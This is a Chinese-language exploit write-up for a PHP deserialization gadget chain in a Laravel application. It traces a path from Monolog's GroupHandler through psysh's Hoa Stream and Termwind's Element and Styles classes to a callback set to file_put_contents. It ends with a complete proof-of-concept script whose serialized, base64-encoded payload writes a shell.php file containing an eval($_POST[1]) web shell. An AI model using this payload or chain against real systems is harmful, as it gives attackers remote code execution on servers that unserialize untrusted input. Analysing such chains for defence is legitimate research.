

## 漏洞分析
`routes/web.php`添加反序列化利用点

```PHP
Route::get("/vul", function (\Illuminate\Http\Request $request) {  
    $str = $request->input("data");  
    unserialize(base64_decode($str));;  
});
```


`vendor/monolog/monolog/src/Monolog/Handler/Handler.php#__destruct()`
该类为abstract抽象类
```PHP
abstract class Handler implements HandlerInterface  
{
	...
	public function __destruct()  
	{  
	    try {  
	        $this->close();  
	    } catch (\Throwable $e) {  
	        // do nothing  
	    }  
	}
	...
}
```
实现类
![](attachments/Pasted%20image%2020241014222431.png)

`vendor/monolog/monolog/src/Monolog/Handler/GroupHandler.php#close()`
GroupHandler对象实例销毁后，调用抽象类的`__destruct`，抽象类close()方法的使用实质调用了其自身的close()方法
```PHP
class GroupHandler extends Handler implements ProcessableHandlerInterface, ResettableInterface  
{  
    use ProcessableHandlerTrait;  
  
    /** @var HandlerInterface[] */  
    protected array $handlers;  
    protected bool $bubble;
    ...
    public function close(): void  
	{  
	    parent::close();  
  
	    foreach ($this->handlers as $handler) {  
	        $handler->close();  
	    }  
	}
	...
}
```

`vendor/psy/psysh/src/Readline/Hoa/Stream.php`
仍为abstract抽象类，选择实现类为FileRead，也就是说等同于`$this->handlers = new FileRead()`，执行`$streamName = $this->getStreamName();`后一直到md5函数的执行，此时`$streamName`为对象时，触发该对象的`__toString`魔术方法

```PHP
abstract class Stream implements IStream, EventListenable  
{  
    use EventListens;
    final public function close()  
	{  
	    $streamName = $this->getStreamName();  
	  
	    if (null === $streamName) {  
	        return;  
	    }  
	  
	    $name = \md5($streamName);  
	  
	    if (!isset(self::$_register[$name])) {  
	        return;  
	    }  
	  
	    Event::notify(  
	        'hoa://Event/Stream/'.$streamName.':close-before',  
	        $this,  
	        new EventBucket()  
	    );  
	  
	    if (false === $this->_close()) {  
	        return;  
	    }  
  
	    unset(self::$_register[$name]);  
	    $this->_bucket[self::HANDLER] = null;  
	    Event::unregister(  
	        'hoa://Event/Stream/'.$streamName  
	    );  
	    Event::unregister(  
	        'hoa://Event/Stream/'.$streamName.':close-before'  
	    );  
	  
	    return;  
	}
}    
```

`getStreamName()`

```PHP
public function getStreamName()  
{  
    if (empty($this->_bucket)) {  
        return null;  
    }  
  
    return $this->_bucket[self::NAME];  
}
```

`vendor/nunomaduro/termwind/src/Components/Element.php`

```PHP
abstract class Element  
{
	public function toString(): string  
	{  
	    if (is_array($this->content)) {  
	        $inheritance = new InheritStyles();  
	        $this->content = implode('', $inheritance($this->content, $this->styles));  
	    }  
	  
	    return $this->styles->format($this->content);  
	}
}
```

![](attachments/Pasted%20image%2020241015095436.png)

```PHP

protected Styles $styles;
final public function __toString(): string  
{  
    return $this->toString();  
}

public function toString(): string  
{  
    if (is_array($this->content)) {  
        $inheritance = new InheritStyles();  
        $this->content = implode('', $inheritance($this->content, $this->styles));  
    }  
  
    return $this->styles->format($this->content);  
}
```

这里的`$this->styles`来于
`vendor/nunomaduro/termwind/src/ValueObjects/Styles.php`

`$modifier`数值可控设置为file_put_contents，直接将$this->properties 作为file_put_contents参数

```PHP
final public function format(string $content): string  
{  
    foreach ($this->textModifiers as $modifier) {  
        $content = $modifier(  
            $content,  
            $this->properties['styles'] ?? [],  
            $this->properties['parentStyles'] ?? []  
        );  
    }  
  
    $content = $this->applyWidth($content);  
  
    foreach ($this->styleModifiers as $modifier) {  
        $content = $modifier($content, $this->properties['styles'] ?? []);  
    }  
  
    return $this->applyStyling($content);  
}
```
## POC

```PHP
<?php
namespace Termwind\ValueObjects{
    Class Styles{
        private array $textModifiers;
        private array $properties;
        public function __construct(){
            $this->textModifiers = ["file_put_contents"];
            $this->properties = ["styles"=>"<?php phpinfo();eval(\$_POST[1]);?>", "parentStyles"=>0];
        }
    }
}
namespace Termwind\Components{
    use Termwind\ValueObjects\Styles;
    abstract Class Element{
        protected string $content;
        protected Styles $styles;
        public function __construct()
        {
            $this->content = 'shell.php';
            $this->styles = new Styles();
        }
    }
    Class Hr extends Element{}
}
namespace Psy\Readline\Hoa{
    use Termwind\Components\Hr;

    abstract Class Stream{
        protected $_bucket;
        public function __construct(){
            $this->_bucket = [new Hr()];
        }
    }
    Class FileRead extends Stream {}
}

namespace Monolog\Handler{
    use Psy\Readline\Hoa\FileRead;
    Class GroupHandler{
        protected array $handlers;
        public function __construct(){
            $this->handlers = [new FileRead()];
        }
    }
}

namespace {
    $obj = new Monolog\Handler\GroupHandler();
    echo serialize($obj);

    echo base64_encode(serialize($obj));
}
```
